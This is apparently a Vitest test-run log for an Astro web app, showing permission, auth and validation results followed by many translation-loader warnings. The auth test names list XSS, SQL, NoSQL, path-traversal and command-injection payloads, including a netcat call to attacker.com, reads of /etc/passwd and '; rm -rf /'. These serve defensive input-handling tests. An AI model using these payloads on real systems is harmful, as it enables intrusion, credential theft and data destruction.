
[1m[46m RUN [49m[22m [36mv4.0.18 [39m[90mC:/Users/Utilisateur/Documents/concordia[39m

 [31mÔØ»[39m tests/unit/admin/permissions.test.ts [2m([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  suppress all logs with { quiet: true }

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:22:30[22m [34m[astro-icon][39m Loaded icons from src/icons, circle-flags, mdi, openmoji
stderr | src/lib/auth/permissions.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[2m20:22:40[22m [34m[types][39m Generated [2m13ms[22m
[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m src/lib/auth/permissions.test.ts [2m([22m[2m26 tests[22m[2m | [22m[31m1 failed[39m[2m)[22m[33m 12595[2mms[22m[39m
     [32mÔ£ô[39m admin -> create_user = true (undefined)[32m 140[2mms[22m[39m
     [32mÔ£ô[39m admin -> delete_user = true (undefined)[32m 121[2mms[22m[39m
     [32mÔ£ô[39m admin -> delete_organization = true (undefined)[32m 108[2mms[22m[39m
     [32mÔ£ô[39m admin -> impersonate_user = true (undefined)[32m 113[2mms[22m[39m
     [32mÔ£ô[39m user -> read_profile = true (undefined)[32m 112[2mms[22m[39m
     [32mÔ£ô[39m user -> update_own_profile = true (undefined)[32m 95[2mms[22m[39m
     [32mÔ£ô[39m user -> delete_user = false (undefined)[32m 90[2mms[22m[39m
     [32mÔ£ô[39m user -> admin_access = false (undefined)[32m 78[2mms[22m[39m
     [32mÔ£ô[39m user -> create_organization = true (undefined)[32m 76[2mms[22m[39m
     [32mÔ£ô[39m owner -> manage_organization = true (undefined)[32m 71[2mms[22m[39m
     [32mÔ£ô[39m owner -> delete_organization = true (undefined)[32m 66[2mms[22m[39m
     [32mÔ£ô[39m owner -> invite_member = true (undefined)[32m 70[2mms[22m[39m
     [32mÔ£ô[39m owner -> remove_member = true (undefined)[32m 69[2mms[22m[39m
     [32mÔ£ô[39m owner -> admin_access = false (undefined)[32m 66[2mms[22m[39m
     [32mÔ£ô[39m member -> read_organization = true (undefined)[32m 67[2mms[22m[39m
     [32mÔ£ô[39m member -> create_project = true (undefined)[32m 74[2mms[22m[39m
     [32mÔ£ô[39m member -> delete_organization = false (undefined)[32m 74[2mms[22m[39m
       [32mÔ£ô[39m owner: ressource own vs other[32m 73[2mms[22m[39m
       [32mÔ£ô[39m member: acc├¿s projet org uniquement[32m 62[2mms[22m[39m
       [32mÔ£ô[39m time-based restrictions[32m 63[2mms[22m[39m
[31m       [31m├ù[31m IP-based restrictions[39m[32m 76[2mms[22m[39m
       [32mÔ£ô[39m user ne peut pas s'auto-promouvoir[32m 66[2mms[22m[39m
       [32mÔ£ô[39m owner ne peut pas supprimer owner[32m 71[2mms[22m[39m
       [32mÔ£ô[39m r├┤le inexistant = deny[32m 59[2mms[22m[39m
       [32mÔ£ô[39m permission inexistante = deny[32m 62[2mms[22m[39m
       [32mÔ£ô[39m context manquant pour ABAC = deny[32m 58[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒöÉ encrypt with Dotenvx: https://dotenvx.com

[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Button/Button.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | src/lib/auth/auth.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

stderr | tests/unit/components/Button/Button.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Button/Button.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/unit/components/Alert/Alert.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[2m20:23:08[22m [34m[types][39m Generated [2m94ms[22m
[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m src/lib/auth/auth.test.ts [2m([22m[2m61 tests[22m[2m | [22m[31m2 failed[39m[2m)[22m[33m 22150[2mms[22m[39m
       [32mÔ£ô[39m cr├®e utilisateur avec password fort[32m 295[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <script>alert(1)</script>[32m 118[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: "<script>alert(1)</script>[32m 108[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: '-alert(1)-'[32m 101[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <img src=x onerror=alert(1)>[32m 101[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: javascript:alert(1)[32m 112[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: ${alert(1)}[32m 83[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: {{constructor.constructor("alert(1)")()}}[32m 79[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <iframe src="javascript:alert(1)"></iframe>[32m 81[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <body onload=alert(1)>[32m 77[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <input onfocus=alert(1) autofocus>[32m 74[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <select onfocus=alert(1) autofocus>[32m 76[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <textarea onfocus=alert(1) autofocus>[32m 72[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <marquee onstart=alert(1)>[32m 75[2mms[22m[39m
       [32mÔ£ô[39m handles XSS payload safely: <div style="background:url(javascript:alert(1))">[32m 76[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: '; DROP TABLE user; --[32m 111[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: ' OR '1'='1[32m 97[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: '; DELETE FROM user WHERE '1'='1'; --[32m 78[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: 1'; UPDATE user SET role='admin' WHERE '1'='1[32m 90[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: ' UNION SELECT * FROM pg_authid --[32m 81[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: '; COPY (SELECT '') TO PROGRAM 'id'; --[32m 83[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: admin'--[32m 208[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: ' or 1=1--[32m 82[2mms[22m[39m
       [32mÔ£ô[39m handles SQL injection safely: ') OR ('1'='1[32m 144[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$ne":null}[32m 115[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$gt":""}[32m 182[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$where":"this.password.length > 0"}[32m 96[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$regex":".*"}[32m 82[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$or":[{}]}[32m 82[2mms[22m[39m
       [32mÔ£ô[39m handles NoSQL injection safely: {"$and":[{"$where":"1==1"}]}[32m 74[2mms[22m[39m
       [32mÔ£ô[39m handles path traversal safely: ../../../etc/passwd[32m 67[2mms[22m[39m
       [32mÔ£ô[39m handles path traversal safely: ..\..\..\windows\system32\config\sam[32m 75[2mms[22m[39m
       [32mÔ£ô[39m handles path traversal safely: ....//....//etc/shadow[32m 68[2mms[22m[39m
       [32mÔ£ô[39m handles path traversal safely: ..%2f..%2f..%2fetc%2fpasswd[32m 69[2mms[22m[39m
       [32mÔ£ô[39m handles path traversal safely: ..%252f..%252fetc%252fpasswd[32m 70[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: ; cat /etc/passwd[32m 77[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: && whoami[32m 77[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: | id[32m 82[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: `id`[32m 78[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: $(id)[32m 76[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: | nc attacker.com 1234[32m 77[2mms[22m[39m
       [32mÔ£ô[39m handles command injection safely: ; rm -rf /[32m 164[2mms[22m[39m
       [32mÔ£ô[39m handles unicode spoofing safely: ´¢ô´¢â´¢Æ´¢ë´¢É´¢ö[32m 77[2mms[22m[39m
       [32mÔ£ô[39m handles unicode spoofing safely: ­Øôê­ØÆ©­Øôç­ØÆ¥­Øôà­Øôë[32m 70[2mms[22m[39m
       [32mÔ£ô[39m handles unicode spoofing safely: ­Øòñ­Øòö­Øòú­ØòÜ­Øòí­ØòÑ[32m 62[2mms[22m[39m
       [32mÔ£ô[39m handles email homograph safely[32m 75[2mms[22m[39m
       [32mÔ£ô[39m handles long field values safely[32m 83[2mms[22m[39m
[31m       [31m├ù[31m hash password diff├®rent pour m├¬me password[39m[33m 859[2mms[22m[39m
       [32mÔ£ô[39m JWT a claims s├®curis├®s[32m 136[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te timing attack (temps similaire)[32m 96[2mms[22m[39m
       [32mÔ£ô[39m rate limit configuration exists[32m 108[2mms[22m[39m
[31m       [31m├ù[31m session unique par device[39m[32m 96[2mms[22m[39m
       [32mÔ£ô[39m envoie email avec token s├®curis├®[32m 94[2mms[22m[39m
       [32mÔ£ô[39m token verification ├á usage unique[32m 89[2mms[22m[39m
       [32mÔ£ô[39m token reset expire[32m 165[2mms[22m[39m
       [32mÔ£ô[39m token reset ├á usage unique[32m 90[2mms[22m[39m
       [32mÔ£ô[39m notification email si password chang├®[32m 81[2mms[22m[39m
       [32mÔ£ô[39m logout invalide token[32m 102[2mms[22m[39m
       [32mÔ£ô[39m session has expected expiry configuration[32m 79[2mms[22m[39m
       [32mÔ£ô[39m log cr├®ation utilisateur[32m 88[2mms[22m[39m
       [32mÔ£ô[39m log ├®chec connexion[32m 83[2mms[22m[39m
[90mstdout[2m | tests/unit/validation.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:23:23[22m [34m[types][39m Generated [2m3ms[22m
[2m20:23:24[22m [34m[types][39m Generated [2m13ms[22m
stderr | tests/unit/validation.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/validation.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/validation.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/validation.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/validation.test.ts [2m([22m[2m96 tests[22m[2m)[22m[33m 18957[2mms[22m[39m
[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  enable debug logging with { debug: true }
[2m20:23:41[22m [34m[content][39m Syncing content
[2m20:23:41[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:23:41[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒöÉ encrypt with Dotenvx: https://dotenvx.com
[2m20:23:42[22m [34m[content][39m Syncing content
[2m20:23:42[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:23:42[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:23:44[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 39 parent entities.
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-ef3f9808 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-3d0f20d6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-13267693 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-f0ff1376 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-9bb2241b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-153bc25a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-829b3c9d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-75b7467c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-4d7685e6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1974855c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-aec14411 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1aa84786 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-cb8cc996 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:23:44[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 60 localized entries in Astro Content Layer.
[2m20:23:44[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 39 parent entities.
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-ef3f9808 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-3d0f20d6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-13267693 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-f0ff1376 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-9bb2241b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-153bc25a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-829b3c9d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-75b7467c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-4d7685e6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1974855c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-aec14411 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1aa84786 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-cb8cc996 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:23:44[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 60 localized entries in Astro Content Layer.
[2m20:23:44[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 164 parent entities.
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3cdaa9fb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fd8e4bc4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-33fb5d39 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-35db7427 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d5a4adf has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3324e589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3dbba740 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4f84b975 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c6bd8108 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6e434fad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4445fe7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-210de9b1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7774cf90 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dc7ba910 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-394f1543 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-52a7de43 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bfaab9c6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-725a5050 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db84c061 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f637349 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9895c9db has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f6c6f302 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-773f0211 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6c6267cd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d525a37b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47085c49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6fdf587a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-aa465471 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-34efb0dc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c1421460 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1a0b4cb0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9531d171 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b7f4d73a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7f7ca00 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5bbf47fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8e054462 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a01cf796 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7aaf63f5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4c3f3986 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98e12337 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2c394312 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d99e5924 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5e5fa063 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a209cf34 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ebde45c8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b902dd5e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6bd4a782 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18ca384f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c16b8687 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b9f0a49e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d439c329 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acd54078 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b5252eff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-895714b0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b4d5ca49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d207bac7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fae34b96 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5248e68e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39e22a61 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b6dea38b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-76b83851 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b58ee3b2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-afd81398 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e7c73a7f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-663a4445 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-960a3a6f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-90f2c4c9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-59fe6d1d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db4f9df2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f889093e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-45012c0c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
